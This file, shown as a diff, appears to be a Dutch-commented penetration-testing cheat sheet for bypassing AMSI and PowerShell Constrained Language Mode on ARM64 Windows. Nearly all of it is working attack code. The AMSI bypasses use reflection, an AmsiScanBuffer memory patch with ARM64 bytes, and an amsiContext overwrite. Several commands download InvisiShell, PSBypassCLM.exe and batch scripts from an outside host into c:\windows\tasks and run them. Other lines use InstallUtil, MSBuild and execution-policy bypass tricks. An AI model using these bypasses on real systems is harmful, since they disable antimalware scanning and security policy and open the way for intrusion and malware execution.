@@ -1,0 +1,52 @@
+# AMSI + CLM Bypass — ARM64 (native ARM64 PowerShell op Windows ARM)
+# Check architectuur: [System.Runtime.InteropServices.RuntimeInformation]::ProcessArchitecture
+# Geeft Arm64 bij native PS ARM64, of X64 bij x64-geëmuleerde PS op ARM64 hardware
+# Tip: Bij X64 output → gebruik amsi_clm_x64; bij Arm64 → onderstaande ARM64-methoden
+
+# --- AMSI Bypass ---
+
+# Methode 1: Reflection (amsiInitFailed) — primair, volledig arch-onafhankelijk
+$r=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils');$f=$r.GetField('amsi'+'Init'+'Failed','NonPublic,Static');$f.SetValue($null,$true)
+
+# Methode 2: Memory patch ARM64 — native ARM64 instructies voor AmsiScanBuffer
+# Vereist native ARM64 PowerShell (ProcessArchitecture = Arm64)
+$Win32=@" using System;using System.Runtime.InteropServices; public class Win32Arm64{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);} "@;Add-Type $Win32Arm64;$l=[Win32Arm64]::LoadLibrary("amsi.dll");$a=[Win32Arm64]::GetProcAddress($l,"AmsiScanBuffer");$p=0;[Win32Arm64]::VirtualProtect($a,[uint32]8,0x40,[ref]$p)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0x00,0x00,0x80,0x52,0xC0,0x03,0x5F,0xD6),0,$a,8)
+# Patch bytes: movz w0,#0 (00 00 80 52) + ret (C0 03 5F D6) = 8 bytes little-endian ARM64
+# ARM64 retourwaarde zit in w0/x0 — movz w0,#0 geeft S_OK (0) terug
+
+# Methode 3: amsiContext null pointer via reflection (arch-onafhankelijk managed code)
+$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+
+# Methode 4: InvisiShell via x64-emulatie (start x64 PS, laad InvisiShell x64)
+# ARM64 Windows ondersteunt x64-emulatie — InvisiShell x64 werkt onder geëmuleerde PS
+iwr -Uri 'http://10.0.0.1/tools/InvisiShell.dll' -OutFile 'c:\windows\tasks\InvisiShell.dll' -TimeoutSec 300
+iwr -Uri 'http://10.0.0.1/tools/RunWithRegistryNonAdmin.bat' -OutFile 'c:\windows\tasks\RunWithRegistryNonAdmin.bat' -TimeoutSec 300
+iwr -Uri 'http://10.0.0.1/tools/RunWithPathAsAdmin.bat' -OutFile 'c:\windows\tasks\RunWithPathAsAdmin.bat' -TimeoutSec 300
+# Start x64 PS op ARM64 hardware: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+# Daarna in x64 PS: cd c:\windows\tasks && RunWithRegistryNonAdmin.bat
+
+# --- CLM Bypass ---
+
+# Methode 1: Custom runspace (meest betrouwbaar op ARM64 — puur managed code)
+powershell -c "$rs=[runspacefactory]::CreateRunspace();$rs.ApartmentState='STA';$rs.ThreadOptions='ReuseThread';$rs.Open();$p=$rs.CreatePipeline();$p.Commands.AddScript('whoami');$p.Invoke()"
+
+# Methode 2: Framework64 via x64-emulatie (InstallUtil werkt op ARM64 via x64-emulatie)
+iwr -Uri 'http://10.0.0.1/tools/PSBypassCLM.exe' -OutFile 'c:\windows\tasks\PSBypassCLM.exe' -TimeoutSec 300
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\tasks\PSBypassCLM.exe
+
+# Methode 3: MSBuild via x64-emulatie
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\tasks\clm_bypass.xml
+
+# Methode 4: x64-geëmuleerde PS starten (omzeilt ARM64-native CLM policies)
+C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c "$ExecutionContext.SessionState.LanguageMode"
+
+# Methode 5: PowerShell 7 native ARM64 (geen legacy CLM, eigen .NET 6+ runtime)
+pwsh -ep bypass -c "$ExecutionContext.SessionState.LanguageMode"
+
+# Check language mode:
+$ExecutionContext.SessionState.LanguageMode
+# Tip: ProcessArchitecture = Arm64 → gebruik ARM64-patch (8 bytes); = X64 → gebruik x64-patch (6 bytes)
+# Tip: ARM64 AMSI gebruikt 4-byte aligned instructies — patch altijd veelvoud van 4 bytes
+# Tip: Reflection (methode 1) is altijd veilig ongeacht architectuur — gebruik dit als primair
+# Tip: InvisiShell native ARM64 DLL bestaat niet officieel — x64-emulatie is alternatief
+# Tip: PS 7.4+ op ARM64 Windows = native Arm64 proces (check met RuntimeInformation)
